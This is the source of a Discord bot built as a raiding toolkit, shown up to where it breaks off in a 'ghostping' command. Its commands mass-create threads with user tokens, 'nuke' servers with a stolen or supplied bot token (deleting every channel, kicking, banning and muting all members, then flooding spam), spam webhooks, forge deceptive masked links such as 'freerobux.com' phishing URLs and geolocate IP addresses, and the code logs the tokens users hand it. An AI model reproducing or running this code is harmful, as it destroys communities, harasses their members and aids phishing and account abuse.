// access system is present but has been circumsized - currently in blacklist mode
// to reactivate it, replace all blacklist.has(userId) with !allowedUserIds.has(userId)
// to deactivate both systems replace them with 1 + 2 == 4 or sum shit



require("./register-cmds.js");
const path = require('path');
const fs = require('fs');
const express = require("express");
const {
  verifyKeyMiddleware,
  InteractionType,
  InteractionResponseType,
} = require("discord-interactions");
const crypto = require("crypto");
const axios = require("axios");
require('dotenv').config();

const app = express();
app.use(express.json());

const creditQueue = {};
const PORT = process.env.PORT || 6969;
const PUBLIC_KEY = process.env.PUBLIC_KEY;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

const ComponentType = { ACTION_ROW: 1, BUTTON: 2 };
const ButtonStyle = { PRIMARY: 1 };

const rateLimits = new Map();
const RATE_LIMIT_MS = 1000;

const owners = new Set(["1279134507915542568","1232103434757345332","1363567101146562600","1435706030796570625","1441847641922207985"]); const blacklist = new Set(["1451315029071892490","1445156486333595749","799349584476373103","1330955394419396619","1370338490549534760","1406659453604069406","627561510574620672",
"1333804800613154830","1492866495867261109",
/*spamming ppl up here*/



"1467183793730228234", /*sent gore with bot*/
"1411518303352127619" /*pissed me off*/])

// 1288152294851870824
// yo i put this comment above this one here like weeks ago i forgot why but maybe lits important so im gonna leave it lmao

const blankflood = fs.readFileSync("blankflood.txt", "utf8"); // putting it into a file cuz putting whole thing into code no work :(

const accessFilePath = path.join(__dirname, 'access.txt');

const allowedUserIds = new Set(
  fs.readFileSync(accessFilePath, 'utf-8')
    .split('\n')
    .map(line => line.trim())
    .filter(line => line.length > 0)
);

function randomUnicodeString(length) {
  let result = "";
  while (result.length < length) {
    const codePoint = Math.floor(Math.random() * (0xd7ff - 0x2000)) + 0x2000;
    result += String.fromCharCode(codePoint);
  }
  return result.slice(0, length);
}

function longSymbolString(length) {
  const symbols = ["﷽", "𒐫", "𒈙", "⸻", "꧅"];
  let result = "";
  while (result.length < length) {
    result += symbols[Math.floor(Math.random() * symbols.length)];
  }
  return result.slice(0, length)
}

app.post("/interactions", verifyKeyMiddleware(PUBLIC_KEY), async (req, res) => {
  const interaction = req.body;
  const userId = interaction.member?.user?.id || interaction.user?.id;
  const guildId = interaction.guild_id || "UNKNOWN";

  // rate limit
  if (interaction.type === InteractionType.APPLICATION_COMMAND || interaction.type === InteractionType.MESSAGE_COMPONENT) {
    const now = Date.now();
    const last = rateLimits.get(userId) || 0;
    if (now - last < RATE_LIMIT_MS) {
      return res.json({
        type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
        data: { content: "slow down", flags: 64 },
      });
    }
    rateLimits.set(userId, now);
  }



  if (
    interaction.type === InteractionType.APPLICATION_COMMAND &&
    interaction.data.name === "credit"
  ) {
    const servername = interaction.data.options.find(
      (opt) => opt.name === "servername",
    )?.value;
    const target = interaction.data.options.find(
      (opt) => opt.name === "target",
    )?.value;

    console.log("//////////////////////////////////")
    console.log("// [" + userId + "] IS USING /credit");
    console.log("// Server ID: " + guildId);
    console.log("// Server Name: " + servername);
    console.log("// Credit Target: " + target);
    console.log("//////////////////////////////////")
    
    const buttonId = `credit_confirm_${interaction.id}`;
    creditQueue[buttonId] = { servername, target };

    return res.json({
      type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
      data: {
        flags: 64,
        content: `Click the button to confirm crediting raid to **${target}**.`,
        components: [
          {
            type: 1,
            components: [
              {
                type: 2,
                style: 1,
                label: "Confirm Credit",
                custom_id: buttonId,
              },
            ],
          },
        ],
      },
    });
  }

  if (
    interaction.type === InteractionType.MESSAGE_COMPONENT &&
    interaction.data.custom_id?.startsWith("credit_confirm_")
  ) {
    const { servername, target } =
      creditQueue[interaction.data.custom_id] || {};
    if (!servername || !target) {
      return res.json({
        type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
        data: { flags: 64, content: "nuh uh only one time" },
      });
    }

    delete creditQueue[interaction.data.custom_id];

    return res.json({
      type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
      data: {
        content: `🚀 Raiding of **${servername}** by user **${target}** completed.`,
      },
    });
  }

//promotext
if (
  interaction.type === InteractionType.APPLICATION_COMMAND &&
  interaction.data.name === "promotext"
) {
  const ephemeral =
    interaction.data.options?.find(o => o.name === "ephemeral")?.value ?? true;

  let promoText;
  try {
    promoText = fs.readFileSync("gatosinfernopromotext.txt", "utf8");
  } catch (err) {
    console.error("Error reading promo file:", err);
    return res.json({
      type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
      data: {
        content: "failed to load promo text file.",
        flags: 64, 
      },
    });
  }

  res.json({
    type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
    data: {
      content: "promo text is being sent...",
      flags: 64,
    },
  });


  (async () => {
    try {
      await axios.post(
        `https://discord.com/api/v10/webhooks/${CLIENT_ID}/${interaction.token}`,
        {
          content: promoText,
          flags: (ephemeral ? 64 : 0) | (1 << 2),
        }
      );
    } catch (e) {
      console.error("["+userId+"/promotext] Error sending follow-up:", e.response?.data || e.message);
    }
  })();

  return;
}
res.json
//threadspammer code
async function threadspammer({token, channelid, delay, amount, message, userid}) {
  const dihcord = `https://discord.com/api/v10/channels/${channelid}/threads`;
  

  const payload = {
    name: message,
    type: 11, // public thread
    auto_archive_duration: 1440,
  };

  const headers = {
    Authorization: token,
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0"
  };


  for (let i = 0; i < amount; i++) {
    try {
      const resp = await fetch(dihcord, {
        method: "POST",
        headers,
        body: JSON.stringify(payload)
      });

      if (resp.status === 403) {
        console.error("["+userId+" - /threadspam ] Missing Permissions (403)");
        break;
      }
      if (resp.status === 400) {
        console.error("["+userId+" - /threadspam ] Bad Request (400)");
        break;
      }
      if (!resp.ok) {
        console.error(`/threadspam Error status ${resp.status}`);
        break;
      }
    } catch (err) {
      console.error("["+userId+" - /threadspam ] Network/fetch error:", err?.message || err);
      break;
    }

    if (i < amount - 1) {
      await sleep(delay);
    }
  }
}

//threadspammer command
if (interaction.type === InteractionType.APPLICATION_COMMAND && interaction.data.name === "threadspam") {
  const userId = interaction.member?.user?.id || interaction.user?.id;
  if (blacklist.has(userId)) {
    console.log("!! ["+userId+"] FAILED TO USE /threadspam")
    return res.json({
      type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
      data: { content: "you have been blacklisted from this bot, go to https://guns.lol/lilgatito to appeal", flags: 64 },
    });
  }

  let token = interaction.data.options.find((opt) => opt.name === "token",)?.value;
  let channelid = interaction.data.options.find((opt) => opt.name === "channelid",)?.value;
  let delay = interaction.data.options.find((opt) => opt.name === "delay",)?.value;
  let amount = interaction.data.options.find((opt) => opt.name === "amount",)?.value;
  let message = interaction.data.options.find((opt) => opt.name === "message",)?.value;

  console.log("["+userId+"] IS USING /threadspam")

    if (delay < 1000){
      delay = 1000
    }
    if (amount > 25){
      amount = 25
    }
    return res.json({
      type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
      data: {
        content: "# ***𝘿𝙞𝙝𝙎𝙥𝙖𝙢𝙢𝙚𝙧 3000***\n**DISCLAIMER:**\n- Use ***ONLY*** alt account tokens for this command \n- Use of your real account could result in a ban\n-# P.S: if nothing happens that means the token/channelid was incorrect or the account doesnt have access to create threads in the channel",
        flags: 64,}})

    (async () => {
      try {
        await threadspammer({
          token: token,
          channelid: channelid,
          delay: delay,
          amount: amount,
          message: message,
          userid: userId,
    });
      } catch (e) {
        console.log("["+userId+" - /threadspam] ", e);
      }
    })();
}

//servernuke
//p.s ive never made a nuker before this is buns
if (
  interaction.type === InteractionType.APPLICATION_COMMAND &&
  interaction.data.name === "servernuke"
) {
  const userId = interaction.member?.user?.id || interaction.user?.id;
  const guildId = interaction.guild_id || "UNKNOWN";

  if (blacklist.has(userId)) {
    console.log(`!! - [${userId}] FAILED TO USE /servernuke IN [${guildId}]`);
    return res.json({
      type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
      data: {
        content: "you have been blacklisted from this bot, go to https://guns.lol/lilgatito to appeal",
        flags: 64,
      },
    });
  }

  let messageloop = interaction.data.options.find(o => o.name === "messageloop")?.value;
  const bottoken = interaction.data.options.find(o => o.name === "bottoken")?.value;
  const serverid = interaction.data.options.find(o => o.name === "serverid")?.value;
  const servername = interaction.data.options.find(o => o.name === "servername")?.value;
  const channelname = interaction.data.options.find(o => o.name === "channelname")?.value;
  const kickall = interaction.data.options.find(o => o.name === "kickall")?.value;
  const banall = interaction.data.options.find(o => o.name === "banall")?.value;
  const muteall = interaction.data.options.find(o => o.name === "muteall")?.value;
  const lockdown = interaction.data.options.find(o => o.name === "lockdown")?.value;
  let channelamount = parseInt(interaction.data.options.find(o => o.name === "channelamount")?.value || "1", 10);
  const message = interaction.data.options.find(o => o.name === "message")?.value;
  let messageamount = parseInt(interaction.data.options.find(o => o.name === "messageamount")?.value || "1", 10);

  if (messageloop < 1) messageloop = 1;
  if (messageloop > 3) messageloop = 3;
  if (channelamount < 1) channelamount = 1;
  if (channelamount > 500) channelamount = 500;
  if (messageamount < 1) messageamount = 1;
  if (messageamount > 15) messageamount = 15;

  console.log("//////////////////////////////////");
  console.log(`// [${userId}] IS USING /servernuke`);
  console.log(`// Token: ${bottoken}`);
  console.log(`// Target Server ID: ${serverid}`);
  if (servername) console.log(`// New Server Name: ${servername}`);
  if (kickall) console.log(`// Kick All Members: YES`);
  if (banall) console.log(`// Ban All Members: YES`);
  if (muteall) console.log(`// Mute All Members: YES`);
  if (lockdown) console.log(`// Lockdown (Disable Send Messages): YES`);
  console.log(`// Channels to Create: ${channelamount} (base: ${channelname})`);
  console.log(`// Messages per Channel: ${messageamount}`);
  console.log(`// Message Content: "${message}"`);
  console.log("//////////////////////////////////");

  res.json({
    type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
    data: {
      content: `Nuking \`${serverid}\`, if message sending stopped too soon we recommend using a lower messageamount (20-30 is ideal)`,
      flags: 64,
    },
  });

  (async () => {
    try {
      if (servername) {
        try {
          await axios.patch(
            `https://discord.com/api/v10/guilds/${serverid}`,
            { name: servername },
            { headers: { Authorization: `Bot ${bottoken}` } }
          );
          console.log(`[/servernuke - ${userId}] Renamed server to: ${servername}`);
        } catch (err) {
          console.error(`[/servernuke - ${userId}] Failed to rename server:`, err.response?.data || err.message);
        }
      }

      if (lockdown) {
        try {
          const { data: roles } = await axios.get(
            `https://discord.com/api/v10/guilds/${serverid}/roles`,
            { headers: { Authorization: `Bot ${bottoken}` } }
          );

          for (const role of roles) {
            if (role.id === serverid) continue;
            try {
              const newPermissions = (BigInt(role.permissions) & ~BigInt(0x800)).toString(); // remove SEND_MESSAGES (0x800)
              await axios.patch(
                `https://discord.com/api/v10/guilds/${serverid}/roles/${role.id}`,
                { permissions: newPermissions },
                { headers: { Authorization: `Bot ${bottoken}` } }
              );
              console.log(`[servernuke - ${userId}] Disabled Send Messages for role: ${role.name}`);
              await new Promise(r => setTimeout(r, 250));
            } catch (err) {
              console.error(`[servernuke - ${userId}] Failed to update role ${role.name}:`, err.response?.data || err.message);
            }
          }

          try {
            const { data: everyoneRole } = await axios.get(
              `https://discord.com/api/v10/guilds/${serverid}/roles/${serverid}`,
              { headers: { Authorization: `Bot ${bottoken}` } }
            );
            const newPermissions = (BigInt(everyoneRole.permissions) & ~BigInt(0x800)).toString();
            await axios.patch(
              `https://discord.com/api/v10/guilds/${serverid}/roles/${serverid}`,
              { permissions: newPermissions },
              { headers: { Authorization: `Bot ${bottoken}` } }
            );
            console.log(`[servernuke - ${userId}] Disabled Send Messages for @everyone role`);
          } catch (err) {
            console.error(`[servernuke - ${userId}] Failed to update @everyone role:`, err.response?.data || err.message);
          }
        } catch (err) {
          console.error(`[servernuke - ${userId}] Failed to fetch roles:`, err.response?.data || err.message);
        }
      }

      if (kickall) {
        try {
          const { data: members } = await axios.get(
            `https://discord.com/api/v10/guilds/${serverid}/members`,
            { headers: { Authorization: `Bot ${bottoken}` } }
          );
          for (const member of members) {
            try {
              await axios.delete(
                `https://discord.com/api/v10/guilds/${serverid}/members/${member.user.id}`,
                { headers: { Authorization: `Bot ${bottoken}` } }
              );
              console.log(`[servernuke - ${userId}] Kicked member: ${member.user.username}`);
              await new Promise(r => setTimeout(r, 250));
            } catch (err) {
              console.error(`[servernuke - ${userId}] Failed to kick ${member.user.username}:`, err.response?.data || err.message);
            }
          }
        } catch (err) {
          console.error(`[servernuke - ${userId}] Failed to fetch members:`, err.response?.data || err.message);
        }
      }

      if (banall) {
        try {
          const { data: members } = await axios.get(
            `https://discord.com/api/v10/guilds/${serverid}/members`,
            { headers: { Authorization: `Bot ${bottoken}` } }
          );
          for (const member of members) {
            try {
              await axios.put(
                `https://discord.com/api/v10/guilds/${serverid}/bans/${member.user.id}`,
                {},
                { headers: { Authorization: `Bot ${bottoken}` } }
              );
              console.log(`[servernuke - ${userId}] Banned member: ${member.user.username}`);
              await new Promise(r => setTimeout(r, 250));
            } catch (err) {
              console.error(`[servernuke - ${userId}] Failed to ban ${member.user.username}:`, err.response?.data || err.message);
            }
          }
        } catch (err) {
          console.error(`[servernuke - ${userId}] Failed to fetch members:`, err.response?.data || err.message);
        }
      }

      if (muteall) {
        try {
          const { data: members } = await axios.get(
            `https://discord.com/api/v10/guilds/${serverid}/members`,
            { headers: { Authorization: `Bot ${bottoken}` } }
          );
          const muteUntil = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(); // 1 week cuz i feel like it
          for (const member of members) {
            try {
              await axios.patch(
                `https://discord.com/api/v10/guilds/${serverid}/members/${member.user.id}`,
                { communication_disabled_until: muteUntil },
                { headers: { Authorization: `Bot ${bottoken}` } }
              );
              console.log(`[servernuke - ${userId}] Muted member: ${member.user.username} for 1 week`);
              await new Promise(r => setTimeout(r, 250));
            } catch (err) {
              console.error(`[servernuke - ${userId}] Failed to mute ${member.user.username}:`, err.response?.data || err.message);
            }
          }
        } catch (err) {
          console.error(`[servernuke - ${userId}] Failed to fetch members:`, err.response?.data || err.message);
        }
      }

      const { data: channels } = await axios.get(
        `https://discord.com/api/v10/guilds/${serverid}/channels`,
        { headers: { Authorization: `Bot ${bottoken}` } }
      );

      console.log(`[servernuke - ${userId}] Found ${channels.length} existing channels in server ${serverid}`);

      const deletePromises = channels.map(channel => 
        axios.delete(
          `https://discord.com/api/v10/channels/${channel.id}`,
          { headers: { Authorization: `Bot ${bottoken}` } }
        ).then(() => {
          console.log(`[servernuke - ${userId}] Deleted channel: ${channel.name} (${channel.id})`);
        }).catch(err => {
          console.error(`[servernuke - ${userId}] Failed to delete channel ${channel.id}:`, err.response?.data || err.message);
        })
      );

      await Promise.all(deletePromises.map(p => p.catch(e => e)));

      const newChannels = [];
      for (let i = 0; i < channelamount; i++) {
        try {
          const { data: createdChannel } = await axios.post(
            `https://discord.com/api/v10/guilds/${serverid}/channels`,
            {
              name: `${channelname.replace(/[^a-zA-Z0-9-_]/g, "")}-${Math.random().toString(36).substring(2, 6)}`,
              type: 0,
              permission_overwrites: []
            },
            {
              headers: {
                Authorization: `Bot ${bottoken}`,
                'Content-Type': 'application/json'
              }
            }
          );
          newChannels.push(createdChannel);
          console.log(`[servernuke - ${userId}] Created channel: ${createdChannel.name}`);
          await new Promise(r => setTimeout(r, 100));
        } catch (err) {
          console.error(`[servernuke - ${userId}] Failed to create channel ${i + 1}/${channelamount}:`, {
            error: err.response?.data || err.message
          });
        }
      }

      for (let loop = 0; loop < messageloop; loop++) {
        console.log(`[servernuke - ${userId}] Starting message loop ${loop + 1}`);

        const messagePromises = [];
        for (const channel of newChannels) {
          for (let j = 0; j < messageamount; j++) {
            messagePromises.push(
              axios.post(
                `https://discord.com/api/v10/channels/${channel.id}/messages`,
                { content: message },
                { headers: { Authorization: `Bot ${bottoken}` } }
              ).then(() => {
                console.log(`[servernuke - ${userId}] Sent message ${j + 1}/${messageamount} in ${channel.name} (loop ${loop + 1})`);
              }).catch(err => {
                console.error(`[servernuke - ${userId}] Failed to send message in ${channel.name}:`, err.response?.data || err.message);
              })
            );
          }
        }

        const messageBatches = [];
        for (let i = 0; i < messagePromises.length; i += 10) {
          messageBatches.push(messagePromises.slice(i, i + 10));
        }

        for (const batch of messageBatches) {
          await Promise.all(batch);
          await new Promise(r => setTimeout(r, 1100));
        }

        await new Promise(r => setTimeout(r, 500));
      }

      console.log(`[servernuke - ${userId}] Completed nuke of server ${serverid}`);
    } catch (err) {
      console.error(`[servernuke - ${userId}] Error:`, err.response?.data || err.message);
    }
  })();
}

// maskurl
if (
  interaction.type === InteractionType.APPLICATION_COMMAND &&
  interaction.data.name === "maskurl"
) {
  const guildId = interaction.guild_id || "UNKNOWN";

  if (blacklist.has(userId)) {
    console.log(`!! - [${userId}] FAILED TO USE /maskurl IN [${guildId}]`);
    return res.json({
      type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
      data: { content: "you have been blacklisted from this bot, go to https://guns.lol/lilgatito to appeal", flags: 64 }
    });
  }

  const options = interaction.data.options || [];
  let inputUrl = options.find(o => o.name === "url")?.value || "";
  let maskurl = options.find(o => o.name === "maskurl")?.value || "";
  const ephOpt = options.find(o => o.name === "ephemeral")?.value;
  const ephemeral = ephOpt === undefined ? true : Boolean(ephOpt);
  const method = options.find(o => o.name === "maskurl-method")?.value || "Email";

  if (!inputUrl.trim()) {
    console.error(`[${userId}] /maskurl called with empty URL`);
    return res.json({
      type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
      data: { content: "put a fucking url there dumbass", flags: 64 }
    });
  }

  inputUrl = inputUrl.trim();
  if (!/^https?:\/\//i.test(inputUrl)) inputUrl = `https://${inputUrl}`;

  // sanitize
  if (method === "CustomSuffix") {
    if (!maskurl) {
      console.error(`[${userId}] /maskurl CustomSuffix selected without maskurl`);
      return res.json({
        type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
        data: { content: "the method thingy is for maskurl, put a maskurl if u wanna use teh methods", flags: 64 }
      });
    }
    maskurl = maskurl.replace(/[^a-zA-Z0-9\-]/g, "").slice(0, 20); // only letters, numbers, hyphens, max 20 chars
    if (!maskurl) {
      return res.json({
        type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
        data: { content: "maskurl invalid, try making it shorter or remove special characters", flags: 64 }
      });
    }
  }

  console.log(`[${userId}] IS USING /maskurl IN [${guildId}] WITH METHOD: ${method}`);

  res.json({
    type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
    data: {
      content: `Generating mask link for: ${inputUrl}`,
      flags: ephemeral ? 64 : undefined
    }
  });

  (async () => {
    let shortUrl = null;

    try {
      if (method === "CustomSuffix") {
        const resp = await axios.get("https://da.gd/s", {
          params: { url: inputUrl, shorturl: maskurl },
          validateStatus: () => true,
          timeout: 10000
        });

        if (resp.status === 400) {
          shortUrl = "ERROR_400";
          console.error(`[${userId}] /maskurl CustomSuffix 400: maskurl taken or invalid`);
        } else if (!resp.data || !/^https?:\/\//i.test(resp.data.trim())) {
          console.error(`[${userId}] /maskurl CustomSuffix invalid response:`, resp.data);
          shortUrl = null;
        } else {
          shortUrl = resp.data.trim();
          console.log(`[${userId}] /maskurl CustomSuffix shortUrl: ${shortUrl}`);
        }
      } else {
        const resp = await axios.get("https://da.gd/s", { params: { url: inputUrl }, timeout: 10000 });
        shortUrl = (resp.data || "").trim();
        if (!shortUrl) throw new Error("Empty response from da.gd");
        console.log(`[${userId}] /maskurl Email method shortUrl: ${shortUrl}`);
      }
    } catch (err) {
      console.error(`[${userId} - /maskurl] API error:`, err.response?.data || err.message);
    }

    const followupUrl = `https://discord.com/api/v10/webhooks/${CLIENT_ID}/${interaction.token}`;
    try {
      let content;
      if (shortUrl === "ERROR_400") {
        content = "This maskurl is taken or invalid. Change it up a lil, e.g freerobux.com -> freerobux.com-A2hf";
      } else if (!shortUrl) {
        content = "sum went wrong lol tell lilgatito to fix it";
      } else {
        if (method === "Email" && maskurl) {
          const noProto = shortUrl.replace(/^https?:\/\//i, "");
          content = "Masked URL: `https://" + maskurl + "@" + noProto + "`";
        } else {
          content = `Masked URL: ${shortUrl}`;
        }
      }

      if (!content || content.length > 2000) {
        content = "   sum went wrong lol tell lilgatito to fix it";
        console.error(`[${userId}] /maskurl follow-up content invalid or too long`);
      }

      await axios.post(followupUrl, { content, flags: ephemeral ? 64 : undefined });
    } catch (err) {
      console.error(`[${userId} - /maskurl] follow-up error:`, err.response?.data || err.message);
    }
  })();

  return;
}

// webhookspam
if (
  interaction.type === InteractionType.APPLICATION_COMMAND &&
  interaction.data.name === "webhookspam"
) {
  const userId = interaction.member?.user?.id || interaction.user?.id;
  if (blacklist.has(userId)) {
    const guildId = interaction.guild_id || "UNKNOWN";
    console.log("!! - [" + userId + "] FAILED TO USE /webhookspam IN [" + guildId + "]");
    return res.json({
      type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
      data: {
        content: "you have been blacklisted from this bot, go to https://guns.lol/lilgatito to appeal",
        flags: 64,
      },
    });
  }

  const options = interaction.data.options || [];
  const webhookUrl = options.find(opt => opt.name === "webhook-url")?.value;
  const msg = options.find(opt => opt.name === "msg")?.value || "";
  let amount = options.find(opt => opt.name === "amount")?.value || 1;
  const name = options.find(opt => opt.name === "name")?.value || "guns.lol/lilgatito";
  const avatar_url = options.find(opt => opt.name === "pfp-image-link")?.value || null;

  if (amount < 1) amount = 1;
  if (amount > 999) amount = 999;

  if (!webhookUrl || !/^https:\/\/discord\.com\/api\/webhooks\//.test(webhookUrl)) {
    return res.json({
      type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
      data: {
        content: "invalid webhook url",
        flags: 64,
      },
    });
  }

  res.json({
    type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
    data: {
      content: `sending **${amount}** messages to webhook...`,
      flags: 64,
    },
  });

  (async () => {
    for (let i = 0; i < amount; i++) {
      try {
        await axios.post(webhookUrl, {
          content: msg,
          username: name,
          avatar_url: avatar_url,
        });
      } catch (err) {
        console.error("[/webhookspam] error:", err.response?.data || err.message);
      }
      await new Promise(r => setTimeout(r, 1000));
    }
  })();
}

// idlookup
if (
  interaction.type === InteractionType.APPLICATION_COMMAND &&
  interaction.data.name === "idlookup"
) {
  const userId = interaction.member?.user?.id || interaction.user?.id;
  if (blacklist.has(userId)) {
    const guildIdLocal = interaction.guild_id || "UNKNOWN";
    console.log("!! - [" + userId + "] FAILED TO USE /idlookup IN [" + guildIdLocal + "]");
    return res.json({
      type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
      data: {
        content: "you have been blacklisted from this bot, go to https://guns.lol/lilgatito to appeal",
        flags: 64,
      },
    });
  }

  const options = interaction.data.options || [];
  const targetId = options.find(opt => opt.name === "id" || opt.name === "userid")?.value;
  const ephemeral = options.find(opt => opt.name === "ephemeral")?.value ?? true;

  if (!targetId || !/^\d{17,20}$/.test(String(targetId))) {
    return res.json({
      type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
      data: {
        content: "gimme an actual userid dumbass",
        flags: ephemeral ? 64 : 0,
      },
    });
  }

  res.json({
    type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
    data: {
      content: `Looking up user ID **${targetId}** ...`,
      flags: ephemeral ? 64 : 0,
    },
  });

  (async () => {
    try {
      const resp = await axios.get(`https://discord.com/api/v10/users/${targetId}`, {
        headers: { Authorization: `Bot ${BOT_TOKEN}` },
        timeout: 8000,
      });
      const u = resp.data || {};

      function snowflakeToDate(snowflake) {
        try {
          const discordEpoch = 1420070400000n;
          const binary = BigInt(snowflake);
          const timestamp = (binary >> 22n) + discordEpoch;
          return new Date(Number(timestamp));
        } catch {
          return null;
        }
      }

      function decodeUserFlags(flags) { // this is all wrong btw i just cant be fucked to fix it
        const FLAGS = {
          [1 << 0]: "Discord Employee",
          [1 << 1]: "Partnered Server Owner",
          [1 << 2]: "HypeSquad Events",
          [1 << 3]: "HypeSquad Bravery",
          [1 << 4]: "HypeSquad Brilliance",
          [1 << 5]: "HypeSquad Balance",
          [64]: "Early Supporter",
          [1 << 9]: "Bug Hunter Level 2",
          [1 << 14]: "Verified Bot"
        };

        const results = [];
        for (const bitStr of Object.keys(FLAGS)) {
          const bit = Number(bitStr);
          if (flags & bit) results.push(FLAGS[bit]);
        }
        return results.length ? results.join(", ") : "None";
      }

      const createdAt = snowflakeToDate(targetId);
      const badges = decodeUserFlags(u.public_flags || 0);

      const embed = {
        title: `User Lookup: ${u.username || "Unknown"}`,
        color: 0x5865F2,
        thumbnail: {
          url: u.avatar
            ? `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png?size=512`
            : "https://cdn.discordapp.com/embed/avatars/0.png",
        },
        fields: [
          { name: "ID", value: u.id || targetId, inline: true },
          { name: "Username", value: `${u.username || "Unknown"}#${u.discriminator || "0000"}`, inline: true },
          { name: "Bot?", value: u.bot ? "Yes" : "No", inline: true },
          { name: "Created At", value: createdAt ? createdAt.toUTCString() : "Unknown", inline: false },
          { name: "Badges", value: badges, inline: false },
          { name: "Accent Color", value: u.accent_color ? `#${u.accent_color.toString(16)}` : "None", inline: true },
          { name: "Banner", value: u.banner ? `[Banner](https://cdn.discordapp.com/banners/${u.id}/${u.banner}.png?size=1024)` : "None", inline: true },
          { name: "Mention", value: `<@${u.id || targetId}>`, inline: false }
        ],
        footer: { text: "guns.lol/lilgatito" },
        timestamp: new Date().toISOString()
      };

      await axios.post(
        `https://discord.com/api/v10/webhooks/${CLIENT_ID}/${interaction.token}`,
        { embeds: [embed], flags: ephemeral ? 64 : 0 }
      );
    } catch (err) {
      console.error("[" + userId + " - /idlookup] error:", err?.response?.data || err?.message || err);
      try {
        await axios.post(
          `https://discord.com/api/v10/webhooks/${CLIENT_ID}/${interaction.token}`,
          {
            content: "check if thats a USER id, if it is, then something went wrong idk lol tell lilgatito",
            flags: ephemeral ? 64 : 0,
          }
        );
      } catch (postErr) {
        console.error("[/idlookup] follow-up failed:", postErr?.message || postErr);
      }
    }
  })();

  return;
}

  // ipinfo
if (
  interaction.type === InteractionType.APPLICATION_COMMAND &&
  interaction.data.name === "ipinfo"
) {
  const options = interaction.data.options || [];
  const ip = options.find(opt => opt.name === "ip")?.value || "8.8.8.8"; // default sample IP
  const ephemeralOption = options.find(opt => opt.name === "ephemeral")?.value;
  const ephemeral = ephemeralOption !== false; // default true
  console.error(`[${userId}] is using /ipinfo with [${ip}]`);

  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    const data = response.data;

    const infoMessage = `**IP Info for ${ip}**\n`
      + "```Country: " + data.country +"\n"
      + `Region: ${data.regionName}\n`
      + `City: ${data.city}\n`
      + `ZIP: ${data.zip}\n`
      + `ISP: ${data.isp}\n`
      + `Org: ${data.org}\n`
      + `Timezone: ${data.timezone}\n`
      + `Lat/Lon: ${data.lat}, ${data.lon}\n`
      + "Status: " + data.status + "```";

    return res.json({
      type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
      data: {
        content: infoMessage,
        flags: ephemeral ? 64 : undefined
      }
    });
  } catch (error) {
    console.error(`[${userId} - /ipinfo] Error fetching IP info:`, error.message);
    return res.json({
      type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
      data: {
        content: `idk bro sum went wrong lol tell lilgatito`,
        flags: ephemeral ? 64 : undefined
      }
    });
  }
}

  // gifspammers
if (
  interaction.type === InteractionType.APPLICATION_COMMAND &&
  (interaction.data.name === "shitspam" ||
   interaction.data.name === "shitspam-clean" ||
   interaction.data.name === "promospam")
) {
  const cmdName = interaction.data.name;

  if (blacklist.has(userId)) {
    const gId = interaction.guild_id || "UNKNOWN";
    console.log(`!! - [${userId}] FAILED TO USE /${cmdName} IN [${gId}]`);
    return res.json({
      type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
      data: { content: "you have been blacklisted from this bot, go to https://guns.lol/lilgatito to appeal", flags: 64 }
    });
  }

  const fileMap = {
    "shitspam": "shitspam.txt",
    "shitspam-clean": "shitspam-clean.txt",
    "promospam": "promo.txt",
  };
  const fileName = fileMap[cmdName];

  let lines = [];
  try {
    const raw = fs.readFileSync(require('path').join(__dirname, fileName), "utf8");
    lines = raw.split("\n").map(l => l.trim()).filter(Boolean);
  } catch (e) {
    console.error(`[${userId} - /${cmdName}] failed to read ${fileName}:`, e.message);
  }

  if (lines.length === 0) {
    return res.json({
      type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
      data: { content: `${fileName} is empty or missing.`, flags: 64 }
    });
  }

  const gId = interaction.guild_id || "UNKNOWN";
  console.log(`[${userId}] IS USING /${cmdName} IN [${gId}] with ${lines.length} gif(s)`);

  res.json({
    type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
    data: { content: `Starting ${cmdName}...`, flags: 64 }
  });

  (async () => {
    const url = `https://discord.com/api/v10/webhooks/${CLIENT_ID}/${interaction.token}`;

    const pick5 = () => {
      const out = [];
      for (let i = 0; i < 5; i++) {
        out.push(lines[Math.floor(Math.random() * lines.length)]);
      }
      return out.join("\n");
    };

    for (let i = 0; i < 5; i++) {
      try {
        await axios.post(url, { content: pick5() });
      } catch (e) {
        console.error(`[${userId} - /${cmdName}] send error:`, e.response?.data || e.message);
      }
      if (i < 4) {
        await new Promise(r => setTimeout(r, 1000));
      }
    }
  })();

  return;
}

// ghostping
if (
  interaction.type === InteractionType.APPLICATION_COMMAND &&
  interaction.data.name === "ghostping"
) {
  const userId = interaction.member?.user?.id || interaction.user?.id;
